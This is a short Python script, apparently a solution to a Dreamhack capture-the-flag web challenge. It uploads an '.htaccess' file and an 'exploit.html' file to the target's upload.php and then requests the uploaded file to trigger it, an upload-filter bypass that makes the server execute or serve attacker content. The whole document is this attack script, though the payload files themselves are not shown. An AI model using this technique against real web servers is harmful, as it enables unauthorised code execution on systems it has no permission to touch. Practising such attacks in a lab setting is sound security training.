import requests

port = 15739
url_index = f"http://host3.dreamhack.games:{port}/"
url_upload = url_index + "upload.php"


def upload_file(file_name):
    files = {"name": file_name, "file": open(file_name, "rb")}
    r = requests.post(url_upload, files=files)


upload_file(".htaccess")
upload_file("exploit.html")

name = "exploit.html"
url_exploit = url_index + f"upload/{name}"
r = requests.get(url_exploit)
print(r.text)
